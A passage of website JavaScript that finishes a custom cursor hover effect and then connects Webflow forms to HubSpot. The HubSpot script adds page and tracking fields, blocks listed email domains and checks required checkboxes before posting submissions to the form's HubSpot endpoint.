      if (this.classList.contains('button-dropdown') && isDescriptionMultiLine(this)) {
        tricksCursor.style.borderRadius = '0.5rem';
      } else {
        tricksCursor.style.borderRadius = '3rem';
      }

      const updatePosition = () => {
        const rect = this.getBoundingClientRect();
        currentTarget.x = rect.left + this.offsetWidth / 2;
        currentTarget.y = rect.top + this.offsetHeight / 2;
        currentTarget.width = this.offsetWidth;
        currentTarget.height = this.offsetHeight;
      };

      updatePosition();
      updateInterval = setInterval(updatePosition, 16);
    });

    element.addEventListener('mouseleave', function (e) {
      clearInterval(updateInterval);

      // Reset border-radius
      tricksCursor.style.borderRadius = '';

      const enteringHoverElement = Array.from(hoverElements).some(el =>
        el === e.relatedTarget || el.contains(e.relatedTarget)
      );

      if (!enteringHoverElement) {
        isFollowingMouse = true;
        currentTarget.width = null;
        currentTarget.height = null;
        tricksCursor.style.width = '';
        tricksCursor.style.height = '';
      }
    });
  });

  window.addEventListener('beforeunload', () => {
    if (animationId) cancelAnimationFrame(animationId);
  });
}

initCustomCursor();
</script>

<script>
window.addEventListener("load", function () {
  let blockedDomains = [];
  fetch('https://hubspotonwebflow.com/assets/js/blockedDomains.json')
  .then(response => response.json())
  .then(data => {
    blockedDomains = data;
  })
  .catch(error => console.error('Error:', error));

  const updateFormData = (formData) => {
    for (let [name, value] of formData.entries()) {
      switch (name) {
        case "hutk":
          const cookies = document.cookie.split(";");
          const cookieMap = {};

          cookies.forEach((cookie) => {
            const [name, value] = cookie.trim().split("=");
            cookieMap[name] = value;
          });

          const hubspotCookie = cookieMap["hubspotutk"];
          if (hubspotCookie) {
            formData.set(name, hubspotCookie);
          }
          break;
        case "pageUri":
          formData.set(name, window.location.href);
          break;
        case "pageName":
          formData.set(name, document.title);
          break;
        case "pageId":
          formData.set(name, window.location.pathname);
          break;
        default:
          break;
      }
    }
    return formData;
  }

  const webflowHubSpotForms = document.querySelectorAll("[data-wf-hs-form]");
  if (webflowHubSpotForms.length > 0) {
    webflowHubSpotForms.forEach(async (form) => {
      const actionUrl = new URL(form.action);
      const pathParts = actionUrl.pathname.split('/');
      const id = pathParts[pathParts.length - 1];
      let blockList = false;

      await fetch(`https://hubspotonwebflow.com/api/forms/blockList?id=${id}`)
      .then(response => response.json())
      .then(data => {
        blockList = data;
      })
      .catch(error => console.error('Error:', error));

    let isBlocked = false;
    const submitButton = form.querySelector('input[type="submit"], button[type="submit"]');
    if(blockList && blockList.enabled) {
      let additionalBlockedDomains = [];
      if(blockList.additionalBlockedDomains && Array.isArray(blockList.additionalBlockedDomains) && blockList.additionalBlockedDomains.length > 0) {
        additionalBlockedDomains = blockList.additionalBlockedDomains;
        blockedDomains.push(...additionalBlockedDomains);
      }
      const emailInputs = form.querySelectorAll('input[type="email"]');
      emailInputs.forEach((input) => {
        input.addEventListener('input', () => {
          const email = input.value;
          const emailDomain = email.split('@')[1];

          const warningMessage = document.createElement('p');
          warningMessage.style.color = 'red';
          warningMessage.style.marginTop = '1rem';
          warningMessage.style.marginBottom = '1rem';
          warningMessage.style.fontSize = '1rem';
          warningMessage.style.display = 'none';
          const existingWarningMessage = input.parentNode.querySelector('.warning-message');
          if (blockedDomains.includes(emailDomain)) {
            isBlocked = true;
            submitButton.disabled = true;
            submitButton.style.cursor = 'not-allowed';
            submitButton.style.backgroundColor = 'grey';
            warningMessage.className = 'warning-message';
            warningMessage.textContent = 'This email domain is blocked. Please enter a different email.';
            warningMessage.style.display = 'block';
            if (existingWarningMessage) {
              input.parentNode.removeChild(existingWarningMessage);
            }

            input.parentNode.appendChild(warningMessage);
          } else {
            isBlocked = false;
            submitButton.disabled = false;
            submitButton.style.cursor = '';
            submitButton.style.backgroundColor = '';
            if(existingWarningMessage) {
              input.parentNode.removeChild(existingWarningMessage);
            }
          }
        });
      });
    }

    const checkboxes = form.querySelectorAll('input[type="checkbox"][required]');
      const checkboxMap = {};
      checkboxes.forEach((checkbox) => {
        const name = checkbox.name;

        if (!checkboxMap[name]) {
          checkboxMap[name] = [];
        }

        checkboxMap[name].push(checkbox);
      });

      let isCheckboxValidationFailed = false;
      Object.values(checkboxMap).forEach((checkboxes) => {
        if (checkboxes.length > 1) {
          const errorMessage = document.createElement('div');
          errorMessage.textContent = 'At least one checkbox must be checked.';
          errorMessage.style.color = 'red';
          errorMessage.style.display = 'none';
          errorMessage.style.marginTop = '1rem';
          errorMessage.style.marginBottom = '1rem';
          errorMessage.style.fontSize = '1rem';
          checkboxes.forEach((checkbox) => {
            checkbox.required = false;

            checkbox.addEventListener('change', () => {
              if (checkbox.checked) {
                errorMessage.style.display = 'none';
                isCheckboxValidationFailed = false;
              }
            });
          });

          const form = checkboxes[0].form;
          form.appendChild(errorMessage);

          form.addEventListener('submit', (event) => {
            const isChecked = checkboxes.some((checkbox) => checkbox.checked);
            if (!isChecked) {
              event.preventDefault();
              errorMessage.style.display = 'block';
              isCheckboxValidationFailed = true;
            } else {
              errorMessage.style.display = 'none';
              isCheckboxValidationFailed = false;
            }
          });
        }
      });

      form.addEventListener("submit", (event) => {
        if (isCheckboxValidationFailed) {
          return;
        }

        event.preventDefault();
        let formData = new FormData(form);
        formData = updateFormData(formData);

        fetch(form.action, {
          method: form.method,
          body: formData,
        })
          .then((response) => response.json())
          .then((data) => {
            if ("redirectUri" in data) {
              window.location.href = data.redirectUri;
            }

            if ("inlineMessage" in data) {
              const message = document.createElement("div");
              message.style.marginTop = "1rem";
              message.style.marginBottom = "1rem";
              message.innerHTML = data.inlineMessage;
              form.appendChild(message);
              message.scrollIntoView({ behavior: "smooth", block: "center" });
            }
          })
          .catch((error) => console.error(error));
      });
    });
  }

  const webflowForms = document.querySelectorAll(
    "[data-webflow-hubspot-api-form-url]"
  );
  if (webflowForms.length > 0) {
    webflowForms.forEach(async (form) => {
      const actionUrl = new URL(form.dataset.webflowHubspotApiFormUrl);
      const pathParts = actionUrl.pathname.split('/');
      const id = pathParts[pathParts.length - 1];
      let blockList = false;

      await fetch(`https://hubspotonwebflow.com/api/forms/blockList?id=${id}`)
      .then(response => response.json())
      .then(data => {
        blockList = data;
      })
      .catch(error => console.error('Error:', error));

      let isBlocked = false;
      const submitButton = form.querySelector('input[type="submit"], button[type="submit"]');
      if(blockList && blockList.enabled) {
        let additionalBlockedDomains = [];
        if(blockList.additionalBlockedDomains && Array.isArray(blockList.additionalBlockedDomains) && blockList.additionalBlockedDomains.length > 0) {
          additionalBlockedDomains = blockList.additionalBlockedDomains;
          blockedDomains.push(...additionalBlockedDomains);
        }
        const emailInputs = form.querySelectorAll('input[type="email"]');
        emailInputs.forEach((input) => {
          input.addEventListener('input', () => {
            const email = input.value;
            const emailDomain = email.split('@')[1];

            const warningMessage = document.createElement('p');
            warningMessage.style.color = 'red';
            warningMessage.style.marginTop = '1rem';
            warningMessage.style.marginBottom = '1rem';
            warningMessage.style.fontSize = '1rem';
            warningMessage.style.display = 'none';
            const existingWarningMessage = input.parentNode.querySelector('.warning-message');
            if (blockedDomains.includes(emailDomain)) {
              isBlocked = true;
              submitButton.disabled = true;
              submitButton.style.cursor = 'not-allowed';
              submitButton.style.backgroundColor = 'grey';
              warningMessage.className = 'warning-message';
              warningMessage.textContent = 'This email domain is blocked. Please enter a different email.';
              warningMessage.style.display = 'block';
              if (existingWarningMessage) {
                input.parentNode.removeChild(existingWarningMessage);
              }

              input.parentNode.appendChild(warningMessage);
            } else {
              isBlocked = false;
              submitButton.disabled = false;
              submitButton.style.cursor = '';
              submitButton.style.backgroundColor = '';
              if(existingWarningMessage) {
                input.parentNode.removeChild(existingWarningMessage);
              }
            }
          });
        });
      }

      form.addEventListener("submit", (event) => {
        event.preventDefault();
        let formData = new FormData(form);
        formData = updateFormData(formData);
        form.querySelectorAll("[data-wfhsfieldname]").forEach((field) => {
          if (field.type === "file") {
            formData.set(field.dataset.wfhsfieldname, field.files[0]);
          } else if(field.type === 'checkbox') {
            if(field.checked) {
              formData.set(field.dataset.wfhsfieldname, field.value);
            }
          } else if(field.type === 'radio') {
            if(field.checked) {
              formData.set(field.dataset.wfhsfieldname, field.value);
            }
          } else {
            formData.set(field.dataset.wfhsfieldname, field.value);
          }
          // formData.delete(field.name);
        });

        fetch(form.dataset.webflowHubspotApiFormUrl, {
          method: "POST",
          body: formData,
        })
          .then((response) => response.json())
          .catch((error) => console.error(error));
      });
    });
  }
});
</script>
